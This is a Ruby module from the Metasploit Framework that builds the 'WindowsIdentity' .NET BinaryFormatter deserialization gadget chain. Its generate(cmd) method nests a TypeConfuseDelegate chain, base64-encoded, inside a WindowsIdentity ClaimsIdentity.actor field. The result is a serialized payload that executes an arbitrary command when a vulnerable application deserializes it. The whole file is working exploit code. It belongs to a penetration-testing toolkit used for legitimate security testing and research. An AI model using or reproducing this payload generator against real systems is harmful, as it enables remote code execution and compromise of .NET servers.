module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class WindowsIdentity < Types::SerializedStream

    # WindowsIdentity
    #   Credits:
    #     Finders: Levi Broderick
    #     Contributors: Alvaro Munoz, Soroush Dalili

    def self.generate(cmd)
      inner = GadgetChains::TypeConfuseDelegate.generate(cmd)

      self.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: 'System.Security.Principal.WindowsIdentity',
            member_names: %w{ System.Security.ClaimsIdentity.actor }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ String },
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 2,
              string: Rex::Text.encode_base64(inner.to_binary_s)
            ))
          ]
        ),
        Types::RecordValues::MessageEnd.new
      ])
    end

  end

end
end
end
end
